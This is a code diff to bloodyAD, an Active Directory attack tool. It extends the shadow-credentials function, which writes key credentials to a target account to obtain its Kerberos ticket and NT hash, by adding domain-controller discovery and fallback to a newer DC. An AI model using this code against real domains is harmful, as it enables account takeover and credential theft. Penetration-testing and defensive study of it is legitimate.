@@ -1,7 +1,8 @@
-import binascii, datetime, random, string, base64
+import binascii, datetime, random, string, base64, collections, asyncio
 from typing import Literal
 from urllib import parse
 from bloodyAD import utils
+from bloodyAD.network import ldap
 from bloodyAD.exceptions import LOG
 from bloodyAD.formatters import accesscontrol, common, cryptography, dns
 from bloodyAD.network.ldap import Change, Scope
@@ -289,11 +290,59 @@ def rbcd(conn, target: str, service: str):
 
 def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
     """
-    Add Key Credentials to target, and use those credentials to retrieve a TGT and a NT hash using PKINIT.
+    Add Key Credentials to target (try to find a suitable DC if provided DC is below Win2016), and use those credentials to retrieve a TGT and a NT hash using PKINIT.
 
     :param target: sAMAccountName, DN, GUID or SID of the target
     :param path: filepath for the generated credentials (TGT ccache or pfx if PKINIT fails)
     """
+
+    dc_dict = collections.defaultdict(dict) 
+    # Check if KeyCredential is supported on current DC or find alternative DC
+    for dc_info in conn.ldap.bloodysearch("CN=Sites,"+conn.ldap.configNC, "(|(objectClass=nTDSDSA)(objectClass=server))", search_scope=Scope.SUBTREE ,attr=["msDS-Behavior-Version","msDS-HasDomainNCs","objectClass", "dNSHostName"], raw=True):
+        if b"nTDSDSA" in dc_info["objectClass"]:
+            parent_name = dc_info["distinguishedName"].split(",", 1)[1]
+            dc_dict[parent_name]["version"] = int(dc_info["msDS-Behavior-Version"][0])
+            dc_dict[parent_name]["domainNCs"] = dc_info["msDS-HasDomainNCs"]
+        elif b"server" in dc_info["objectClass"]:
+            dc_dict[dc_info["distinguishedName"]]["hostname"] = dc_info["dNSHostName"][0].decode()
+    has_KeyCredential = True
+    alt_servers = []
+    for dn,dc_info in dc_dict.items():
+        if dn == conn.ldap._serverinfo["serverName"]:
+            if dc_info["version"] < 7:
+                has_KeyCredential = False
+            else:
+                break
+        elif dc_info["version"] > 6 and conn.ldap.domainNC.encode() in dc_info.get("domainNCs"):
+            alt_servers.append(dc_info["hostname"])
+
+    # If server in forest but not domain with keycredential support, can it be used?
+    if not has_KeyCredential:
+        LOG.warning(
+            "[!] This DC does not seem to support KeyCredentialLink"
+        )
+        if not alt_servers:
+            LOG.error("[!] No DC with Windows Server 2016 or higher found on this domain, operation aborted")
+            return
+
+        LOG.info(f"[*] Attempting alternative DCs with KeyCredentialLink support: {alt_servers}")
+        record_list = []
+        for srv_name in alt_servers:
+            record_list.append({"type": ["A"], "name": srv_name})
+        host_params = asyncio.get_event_loop().run_until_complete(ldap.findReachableServer(record_list,conn.conf.dns,conn.conf.dcip, [389,636]))
+        if not host_params:
+            LOG.warning(
+                f"[!] No reachable alternative DC found, try to provide one manually in --host or a dns server with --dns"
+            )
+            return
+        schemes = {389: "ldap", 636: "ldaps", 3268: "gc", 3269: "gc-ssl"}
+        conn = conn.copy(
+                scheme=schemes[host_params["port"]],
+                host=host_params["name"],
+                dcip=host_params["ip"],
+            )
+
+
 
     target_dn = None
     target_sAMAccountName = None
@@ -368,6 +417,8 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
             ccache_path = path + ".ccache"
             client.ccache.to_file(path + ".ccache")
             LOG.info('[+] TGT stored in ccache file %s' % ccache_path)
+        # For the newconn opened if we had to use an alternative DC
+        conn.ldap.close()
     
     return [{cred[0]:cred[1]} for cred in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decticket)]
 
